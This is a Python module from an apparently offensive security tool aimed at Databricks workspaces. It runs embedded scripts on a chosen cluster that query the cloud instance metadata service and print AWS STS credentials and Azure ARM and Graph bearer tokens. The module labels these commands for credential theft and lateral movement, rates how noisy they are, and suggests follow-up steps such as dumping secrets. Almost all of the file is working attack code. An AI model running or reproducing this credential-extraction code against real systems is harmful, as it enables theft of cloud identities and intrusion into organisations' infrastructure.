"""IMDS module — cloud credential extraction via cluster IMDS (requires --aggressive)"""

from bb.core.display import console, next_step


_AWS_SCRIPT = """
import urllib.request, json
token_url = "http://169.254.169.254/latest/api/token"
req = urllib.request.Request(token_url, headers={"X-aws-ec2-metadata-token-ttl-seconds":"21600"}, method="PUT")
token = urllib.request.urlopen(req).read().decode()
role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
req2 = urllib.request.Request(role_url, headers={"X-aws-ec2-metadata-token": token})
role = urllib.request.urlopen(req2).read().decode().strip()
cred_url = role_url + role
req3 = urllib.request.Request(cred_url, headers={"X-aws-ec2-metadata-token": token})
creds = json.loads(urllib.request.urlopen(req3).read())
print(f"Role: {role}")
print(f"AccessKeyId:     {creds['AccessKeyId']}")
print(f"SecretAccessKey: {creds['SecretAccessKey']}")
print(f"Token:           {creds['Token']}")
print(f"Expiration:      {creds['Expiration']}")
"""

_AZURE_ARM_SCRIPT = """
import urllib.request, json
url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
req = urllib.request.Request(url, headers={"Metadata":"true"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"access_token : {resp.get('access_token','?')}")
print(f"expires_in   : {resp.get('expires_in','?')}s")
print(f"token_type   : {resp.get('token_type','?')}")
"""

_AZURE_GRAPH_SCRIPT = """
import urllib.request, json
url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
req = urllib.request.Request(url, headers={"Metadata":"true"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"access_token : {resp.get('access_token','?')}")
print(f"expires_in   : {resp.get('expires_in','?')}s")
"""


def _exec_on_cluster(w, cluster_id: str, script: str):
    from databricks.sdk.service.compute import Language
    ctx    = w.command_execution.create(cluster_id=cluster_id, language=Language.PYTHON).result()
    result = w.command_execution.execute(
        cluster_id=cluster_id,
        context_id=ctx.id,
        language=Language.PYTHON,
        command=script,
    ).result()
    w.command_execution.destroy(cluster_id=cluster_id, context_id=ctx.id)
    return result.results.data if result.results else "(no output)"


def _get_cluster(flags) -> str:
    cluster_id = flags.get("cluster") or flags.get("id")
    if not cluster_id:
        cluster_id = input("Cluster ID (from: compute clusters --run): ").strip()
    return cluster_id


def run_aws(w, conn, profile, flags):
    if not flags.get("aggressive"):
        console.print("[yellow]EXEC operation — requires --aggressive flag[/yellow]")
        return
    cluster_id = _get_cluster(flags)
    console.print(f"\n[bold]AWS IMDS → STS Credentials[/bold]  [dim]{cluster_id}[/dim]\n")
    try:
        output = _exec_on_cluster(w, cluster_id, _AWS_SCRIPT)
        console.print(f"[yellow]{output}[/yellow]")
        next_step("secrets dump --cluster <cluster_id> --aggressive --run",
                  "recon attack-surface --run")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def run_azure_arm(w, conn, profile, flags):
    if not flags.get("aggressive"):
        console.print("[yellow]EXEC operation — requires --aggressive flag[/yellow]")
        return
    cluster_id = _get_cluster(flags)
    console.print(f"\n[bold]Azure IMDS → ARM Token[/bold]  [dim]{cluster_id}[/dim]\n")
    try:
        output = _exec_on_cluster(w, cluster_id, _AZURE_ARM_SCRIPT)
        console.print(f"[yellow]{output}[/yellow]")
        next_step("imds azure-graph --cluster <cluster_id> --aggressive --run",
                  "secrets dump --cluster <cluster_id> --aggressive --run")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def run_azure_graph(w, conn, profile, flags):
    if not flags.get("aggressive"):
        console.print("[yellow]EXEC operation — requires --aggressive flag[/yellow]")
        return
    cluster_id = _get_cluster(flags)
    console.print(f"\n[bold]Azure IMDS → Graph Token[/bold]  [dim]{cluster_id}[/dim]\n")
    try:
        output = _exec_on_cluster(w, cluster_id, _AZURE_GRAPH_SCRIPT)
        console.print(f"[yellow]{output}[/yellow]")
        next_step("imds azure-arm --cluster <cluster_id> --aggressive --run",
                  "secrets dump --cluster <cluster_id> --aggressive --run")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


COMMANDS = {
    "aws": {
        "description": "Extract AWS STS credentials from cluster IMDS",
        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
        "prereqs": ["Running cluster ID", "--aggressive flag"],
        "caveats": [
            "IMDSv2 used — token fetched before credential request",
            "Cluster must have an instance profile attached",
        ],
        "aggressive": ["Cluster code execution via IMDS"],
        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
        "required_flags": ["--cluster"],
        "fn": run_aws,
    },
    "azure-arm": {
        "description": "Extract Azure ARM bearer token from cluster managed identity",
        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
        "prereqs": ["Running cluster ID", "--aggressive flag", "Azure workspace"],
        "caveats": ["Token valid for management.azure.com — use for ARM API calls"],
        "aggressive": ["Cluster code execution via IMDS"],
        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
        "required_flags": ["--cluster"],
        "fn": run_azure_arm,
    },
    "azure-graph": {
        "description": "Extract Azure Graph bearer token from cluster managed identity",
        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
        "prereqs": ["Running cluster ID", "--aggressive flag", "Azure workspace"],
        "caveats": ["Token valid for graph.microsoft.com — use for AAD/Entra API calls"],
        "aggressive": ["Cluster code execution via IMDS"],
        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
        "required_flags": ["--cluster"],
        "fn": run_azure_graph,
    },
}
